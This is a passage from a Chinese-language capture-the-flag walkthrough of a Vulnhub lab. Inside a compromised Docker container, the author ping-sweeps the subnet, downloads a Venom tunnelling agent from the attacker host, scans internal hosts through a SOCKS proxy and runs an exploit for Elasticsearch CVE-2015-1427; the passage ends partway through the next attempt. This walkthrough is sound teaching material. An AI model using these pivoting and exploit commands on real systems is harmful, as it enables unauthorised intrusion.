shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # ls /.dockerenv<br>/.dockerenv<br>/app # ip addr<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN <br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>6: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP <br>    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>/app # ifconfig     <br>eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:03  <br>          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0<br>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br>          RX packets:26237 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:25914 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:2396416 (2.2 MiB)  TX bytes:3539722 (3.3 MiB)<br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          UP LOOPBACK RUNNING  MTU:65536  Metric:1<br>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)<br><br>/app # cat /proc/1/cgroup<br>11:hugetlb:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>10:perf_event:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>9:blkio:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>8:freezer:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>7:devices:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>6:memory:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>5:cpuacct:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>4:cpu:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>3:cpuset:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>2:name=systemd:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>/app # <br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><blockquote><p><a href="https://www.jianshu.com/p/1c818749e5b7">No.1ï¼švulhub blog-social-network - ç®€ä¹¦ (jianshu.com)</a><br><a href="https://blog.csdn.net/weixin_44288604/article/details/125318405">Vulnhubé¶æœºï¼šBOREDHACKERBLOG: SOCIAL NETWORK_lainwithçš„åšå®¢-CSDNåšå®¢</a></p></blockquote><h3 id="1ã€å†…ç½‘æ¸—é€"><a href="#1ã€å†…ç½‘æ¸—é€" class="headerlink" title="1ã€å†…ç½‘æ¸—é€"></a>1ã€å†…ç½‘æ¸—é€</h3><ul><li>åŸºæœ¬åŸç†ï¼šä½¿ç”¨ä»£ç†å·¥å…·ï¼Œå»ºç«‹ kali ä¸å†…ç½‘æœºå™¨çš„ä¸€æ¡éš§é“ï¼Œå°† kali ä¸å†…ç½‘æœºå™¨æ‰“é€šï¼Œkali ä¸­çš„å·¥å…·å¯ä»¥é€šè¿‡è¯¥éš§é“è¿›è¡Œå·¥ä½œã€‚</li><li>Vemon åŸºæœ¬æ­¥éª¤ï¼š<ul><li>å°† agent æ‹·è´åˆ°ç›®æ ‡ä¸»æœºï¼Œèµ‹äºˆå¯æ‰§è¡Œæƒé™</li><li>å¼€å¯ vemon æœåŠ¡ç«¯ï¼š<code>./admin_linux_x64 -lport 9999</code></li><li>å¼€å¯ vemon å®¢æˆ·ç«¯ï¼š<code>./a -rhost 192.168.135.1041 -rport 9999</code></li></ul></li></ul><h4 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # for i in $(seq 1 4); do ping -c 1 172.17.0.$i; done<br>PING 172.17.0.1 (172.17.0.1): 56 data bytes<br>64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.631 ms<br><br>--- 172.17.0.1 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.631/0.631/0.631 ms<br>PING 172.17.0.2 (172.17.0.2): 56 data bytes<br>64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.507 ms<br><br>--- 172.17.0.2 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.507/0.507/0.507 ms<br>PING 172.17.0.3 (172.17.0.3): 56 data bytes<br>64 bytes from 172.17.0.3: seq=0 ttl=64 time=0.025 ms<br><br>--- 172.17.0.3 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.025/0.025/0.025 ms<br>PING 172.17.0.4 (172.17.0.4): 56 data bytes<br><br><br>--- 172.17.0.4 ping statistics ---<br>1 packets transmitted, 0 packets received, 100% packet loss<br></code></pre></td></tr></table></figure><h4 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h4><p>é€šè¿‡ ping å‘½ä»¤ï¼Œå‘ç°å†…ç½‘ä¸­å­˜åœ¨åˆ«çš„ä¸»æœºï¼Œå¦‚æœæˆ‘æƒ³æ¢æµ‹å†…ç½‘çš„å®é™…æƒ…å†µï¼ŒåŒ…æ‹¬å­˜æ´»ä¸»æœºæœ‰å“ªäº›ã€åˆ†åˆ«å¼€æ”¾äº†å“ªäº›ç«¯å£ï¼Œé‚£ä¹ˆå°±å¿…é¡»ç©¿é€å†…ç½‘ï¼Œæ‰èƒ½å®ç°å†…ç½‘æ¢æµ‹ã€‚</p><p>å†…ç½‘ç©¿é€å¯é€‰çš„å·¥å…·æœ‰å¾ˆå¤šï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨ Venomï¼Œä½ å¯ä»¥åœ¨å®ƒçš„ github ä¸»é¡µçœ‹åˆ°ä¸­æ–‡ä½¿ç”¨æŒ‡å—ï¼š<a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><p><strong>1ã€åˆ¤æ–­é¶æœºä½æ•°</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # uname -a<br>Linux dbca22cf339d 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 Linux<br></code></pre></td></tr></table></figure><p>å¾—çŸ¥ç›®æ ‡æ˜¯ 64 ä½ç³»ç»Ÿ ã€‚</p><p><strong>2ã€æŠ•é€’ venom</strong></p><p>åœ¨ kali ä¸Šé¢ä½¿ç”¨ python å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span>      <br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [01/Jul/2022 21:40:58] &quot;GET /tools/Venom/agent_linux_x64 HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure><p>é¶æœºä½¿ç”¨ wget å‘½ä»¤ä¸‹è½½ä»£ç†å·¥å…·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # wget http://192.168.135.141:8888/tools/Venom/agent_linux_x64<br>Connecting to 192.168.135.141:8888 (192.168.135.141:8888)<br>agent_linux_x64      100% |*******************************|  3791k  0:00:00 ETA<br></code></pre></td></tr></table></figure><p><strong>3ã€è¿è¡Œ venom</strong></p><p>kali å¼€å¯ç›‘å¬ï¼Œç­‰å¾…ç›®æ ‡çš„å®¹å™¨ç³»ç»Ÿè·Ÿ kali å»ºç«‹è¿æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./admin_linux_x64 -lport 9999</span><br>Venom Admin Node Start...<br><br>  ____   ____  &#123; v1.1  author: Dlive &#125;<br>  \   \ /   /____   ____   ____   _____<br>   \   Y   // __ \ /    \ /    \ /     \<br>    \     /\  ___/|   |  (  &lt;_&gt; )  Y Y  \<br>     \___/  \___  &gt;___|  /\____/|__|_|  /<br>                \/     \/             \/<br><br>(admin node) &gt;&gt;&gt; <br></code></pre></td></tr></table></figure><p>é¶æœºè¿è¡Œä»£ç†å·¥å…·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # chmod +x agent_linux_x64<br>/app # ./agent_linux_x64 -rhost 192.168.135.141 -rport 9999<br>2022/07/02 09:45:31 [+]Successfully connects to a new node<br></code></pre></td></tr></table></figure><p>kali è¿æ¥æˆåŠŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./admin_linux_x64 -lport 9999</span><br>Venom Admin Node Start...<br><br>  ____   ____  &#123; v1.1  author: Dlive &#125;<br>  \   \ /   /____   ____   ____   _____<br>   \   Y   // __ \ /    \ /    \ /     \<br>    \     /\  ___/|   |  (  &lt;_&gt; )  Y Y  \<br>     \___/  \___  &gt;___|  /\____/|__|_|  /<br>                \/     \/             \/<br><br>(admin node) &gt;&gt;&gt; <br>[+]Remote connection:  192.168.135.151:35936<br>[+]A new node connect to admin node success<br>(admin node) &gt;&gt;&gt; show# show æ˜¾ç¤ºç½‘ç»œæ‹“æ‰‘,ä¸‹é¢çš„æ‹“æ‰‘å›¾è¡¨ç¤ºï¼Œadmin èŠ‚ç‚¹ä¸‹è¿æ¥äº† 1 èŠ‚ç‚¹<br>A# A è¡¨ç¤º admin èŠ‚ç‚¹<br>+ -- 1# æ•°å­—è¡¨ç¤º agent èŠ‚ç‚¹<br>(admin node) &gt;&gt;&gt; goto 1# goto æ“ä½œæŸèŠ‚ç‚¹<br>node 1<br>(node 1) &gt;&gt;&gt; socks 1080# socks å»ºç«‹åˆ°æŸèŠ‚ç‚¹çš„ socks5 ä»£ç†<br>a socks5 proxy of the target node has started up on the local port 1080.<br>(node 1) &gt;&gt;&gt; <br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸ socks å‘½ä»¤ä¹‹åï¼Œä¼šåœ¨ admin èŠ‚ç‚¹æœ¬åœ°å¼€å¯ä¸€ä¸ªç«¯å£ï¼Œé€šè¿‡ 1080 ç«¯å£å³å¯è¿›è¡Œ socks5 ä»£ç†</p><p><strong>4ã€é…ç½®socksä»£ç†</strong></p><p>è™½ç„¶æˆ‘ä»¬å»ºç«‹åˆ°æŸèŠ‚ç‚¹çš„ socks5 ä»£ç†ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ proxychains4 æ¥æŒ‚è½½è¿™ä¸ªä»£ç†ï¼Œæ‰èƒ½è®© nmap ç­‰å·¥å…·å¯ä»¥ä½¿ç”¨è¯¥ä»£ç†å»æ”»å‡»ç›®æ ‡ã€‚</p><p>é…ç½® proxychains4.conf ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo vi /etc/proxychains4.conf</span>        <br>[sudo] password for kali: <br><span class="hljs-meta">#</span><span class="bash"> socks5 127.0.0.1 1080</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> tail -5 /etc/proxychains4.conf</span> <br><span class="hljs-meta">#</span><span class="bash"> add proxy here ...</span><br><span class="hljs-meta">#</span><span class="bash"> meanwile</span><br><span class="hljs-meta">#</span><span class="bash"> defaults <span class="hljs-built_in">set</span> to <span class="hljs-string">&quot;tor&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"> socks4        127.0.0.1 9050</span><br>socks5 127.0.0.1 1080<br></code></pre></td></tr></table></figure><h4 id="å†…ç½‘æ‰«æ"><a href="#å†…ç½‘æ‰«æ" class="headerlink" title="å†…ç½‘æ‰«æ"></a>å†…ç½‘æ‰«æ</h4><p>åœ¨ä¸Šæ–‡ä½¿ç”¨ ping å‘½ä»¤åšäº†å†…ç½‘ä¸»æœºå‘ç°ï¼Œå½“æ—¶å‘ç° 172.17.0.1 æ˜¯å­˜æ´»ä¸»æœºã€‚å€Ÿé‰´åœ¨ vmware è™šæ‹Ÿç½‘ç»œä¸­ï¼Œx.x.x.1 å¾€å¾€ä»£è¡¨ç€å®¿ä¸»æœºï¼Œè¿™é‡Œå…ˆå¯¹ 172.17.0.1 è¿›è¡Œæµ‹è¯•ï¼Œçœ‹çœ‹å®ƒèº«ä¸Šæœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p><p><strong>ä½¿ç”¨ nmap æ‰«æå†…ç½‘åœ°å€ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT 172.17.0.1</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.<br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 21:59 EDT<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:993 &lt;--socket error or timeout!<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:443 &lt;--socket error or timeout!<br>[......]<br>Nmap scan report for 172.17.0.1 (172.17.0.1)<br>Host is up (0.012s latency).<br>Not shown: 998 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>5000/tcp open  upnp<br><br>Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p22,5000 172.17.0.1</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.<br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 22:02 EDT<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:22  ...  OK<br>[......]<br>Nmap scan report for 172.17.0.1 (172.17.0.1)<br>Host is up (0.012s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)<br>5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds<br></code></pre></td></tr></table></figure><p>å®ƒä¹Ÿå¼€æ”¾ç€ 22 å’Œ 5000 ç«¯å£ï¼Œç»™ kali çš„æµè§ˆå™¨é…ç½® socks5 ä»£ç†ï¼Œçœ‹çœ‹è¿™ä¸ª 172.17.0.1 çš„ 5000 ç«¯å£æ˜¯ä»€ä¹ˆï¼Œå‘ç°å’Œ docker 1 ä¸€æ ·ã€‚</p><p>M1 ç›´æ¥ç»™ kali çš„æµè§ˆå™¨é…ç½®ä»£ç†ï¼šè®¾ç½®é‡Œé…ç½®ä»£ç†</p><p>M2 ä½¿ç”¨ proxychains4 ç»™ firefox é…ç½®ä»£ç†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 firefox</span><br></code></pre></td></tr></table></figure><p>M3 ä½¿ç”¨ curlï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl http://172.17.0.1:5000</span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl http://172.17.0.1:5000/admin</span><br></code></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€ï¼Œ172.17.0.1 æ˜¯192.168.135.151 çš„å®¿ä¸»æœºï¼Œåªä¸è¿‡ 172.17.0.1 æ˜¯å®¿ä¸»æœºé¢å‘å†…ç½‘çš„ ipã€‚</p><blockquote><p>å¦‚æœè¿™è®©ä½ æ„Ÿåˆ°éš¾ä»¥ç†è§£ï¼Œå¯ä»¥æ¢ä¸ªè¯´æ³•ï¼Œä½ ä¸€å®šç¢°åˆ°è¿‡è¿™ä¸­æƒ…å†µï¼Œä½ å¸Œæœ›æŠŠè‡ªå·±ç‰©ç†æœºä¸Šçš„æŸä¸ªæ–‡ä»¶ä¸¢åˆ°è™šæ‹Ÿæœºä¸­ï¼Œä½†æ˜¯ vmware-tools å¤±æ•ˆäº†ï¼Œä½ æ— æ³•ç›´æ¥æŠŠæ–‡ä»¶æ‹–åŠ¨åˆ°è™šæ‹Ÿæœºé‡Œé¢ã€‚äºæ˜¯ä½ åœ¨ç‰©ç†æœºä¸Šä½¿ç”¨ python æˆ–è€…åˆ«çš„ä»€ä¹ˆå·¥å…·å¼€å¯äº†ä¸€ä¸ª web æœåŠ¡ï¼Œç„¶åä½ åœ¨è™šæ‹Ÿæœºå°±å¯ä»¥ä¸‹è½½æ–‡ä»¶äº†ã€‚ä½†æ˜¯ä½ åœ¨è™šæ‹Ÿæœºçš„æµè§ˆå™¨ä¸­è¾“å…¥çš„ï¼Œä¸€å®šæ˜¯ x.x.x.1ï¼Œå› ä¸ºè¿™ä¸ªåœ°å€æ‰æ˜¯ç‰©ç†æœºå¯ä»¥ä¸è™šæ‹Ÿæœºäº¤äº’çš„åœ°å€ã€‚</p></blockquote><p>è€ƒè™‘åˆ°å½“åˆæ‹¿ shell çš„æ—¶å€™ï¼Œå°±æ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œä¼°è®¡å°±ç®—æ‹¿ä¸‹ 172.17.0.1 ä¹Ÿæ˜¯å¦‚æ­¤ã€‚åœ¨ä¸»æœºå‘ç°çš„æ—¶å€™ï¼Œ172.17.0.2 ä¹Ÿæ˜¯å­˜æ´»ä¸»æœºï¼Œçœ‹çœ‹å®ƒæœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¿¡æ¯ã€‚</p><p><strong>æ‰«æå…¶ä»–ä¸»æœºï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT 172.17.0.2</span><br>Nmap scan report for 172.17.0.2 (172.17.0.2)<br>Host is up (0.0096s latency).<br>Not shown: 999 closed ports<br>PORT     STATE SERVICE<br>9200/tcp open  wap-wsp<br><br>Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p9200 172.17.0.2</span><br>Nmap scan report for 172.17.0.2<br>Host is up (0.014s latency).<br><br>PORT     STATE SERVICE VERSION<br>9200/tcp open  http    Elasticsearch REST API 1.4.2 (name: Damon Dran; cluster: elasticsearch; Lucene 4.10.2)<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 24.84 seconds<br></code></pre></td></tr></table></figure><p>å‘ç°è¿™ä¸ª ip ä¸Šè·‘ç€ Elasticsearch æœåŠ¡ï¼Œç™¾åº¦ä¸€ä¸‹å‘ç°è¿™ä¸ªæœåŠ¡æ›¾ç»çˆ†å‡ºè¿‡ RCE æ¼æ´ï¼Œé‚£æˆ‘ä»¬å°±è¯•è¯•ï¼Œçœ‹èƒ½ä¸èƒ½æ‹¿ä¸‹è¿™å°ä¸»æœºã€‚</p><h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>æœç´¢æ¼æ´åº“ï¼Œå‘ç°å­˜åœ¨ RCE åˆ©ç”¨æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit Elasticsearch</span><br>----------------------- ---------------------------------<br> Exploit Title         |  Path<br>----------------------- ---------------------------------<br>ElasticSearch - Remote | linux/remote/36337.py<br>ElasticSearch - Remote | multiple/webapps/33370.html<br>----------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/exploitdb/exploits/linux/remote/36337.py ./</span><br></code></pre></td></tr></table></figure><p>çœ‹äº†ä¸‹ä»£ç ï¼Œå‘ç°æ˜¯ python2 å†™çš„ï¼Œè¿è¡Œè„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 python2 36337.py 172.17.0.2</span>  <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>                                                                       <br> Exploit for ElasticSearch , CVE-2015-1427   Version: 20150309.1                                                         <br>&#123;*&#125; Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something<br><span class="hljs-meta">~$</span><span class="bash"> id</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>Traceback (most recent call last):<br>  File &quot;36337.py&quot;, line 56, in &lt;module&gt;<br>    main(args=sys.argv)<br>  File &quot;36337.py&quot;, line 53, in main<br>    exploit(target=args[1])<br>  File &quot;36337.py&quot;, line 47, in exploit<br>    execute_command(target=target, command=cmd)<br>  File &quot;36337.py&quot;, line 36, in execute_command<br>    fuckingjson = values[&#x27;hits&#x27;][&#x27;hits&#x27;][0][&#x27;fields&#x27;][&#x27;lupin&#x27;][0]<br>IndexError: list index out of range<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨å¤±è´¥"><a href="#åˆ©ç”¨å¤±è´¥" class="headerlink" title="åˆ©ç”¨å¤±è´¥"></a>åˆ©ç”¨å¤±è´¥</h4><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/GALi_233/article/details/119841078">https://blog.csdn.net/GALi_233/article/details/119841078</a></p></blockquote><p>å°è¯•åˆ©ç”¨ï¼Œå‘ç°å¤±è´¥ï¼Œéšåæˆ‘åˆé€šè¿‡ MSF çš„ exp è¿›è¡Œåˆ©ç”¨ï¼Œä¹Ÿå¤±è´¥ï¼Œäºæ˜¯åˆæ‰‹åŠ¨æäº¤ payload å‘ç°è¿˜æ˜¯ä¸è¡Œ ã€‚</p><p>è¯¥æ¼æ´åˆ©ç”¨éœ€è¦è‡³å°‘ä¸€æ¡æ•°æ®ï¼Œå¦åˆ™æ— æ³•åˆ©ç”¨æˆåŠŸï¼ŒåŸå› æ˜¯æœåŠ¡é‡Œé¢æ²¡æœ‰æ•°æ®ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ search æ¥æœç´¢è¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼Œ</p><p>æ’å…¥ä¸€æ¡æ•°æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -X POST <span class="hljs-string">&#x27;http://172.17.0.3:9200/doc/test&#x27;</span> -d <span 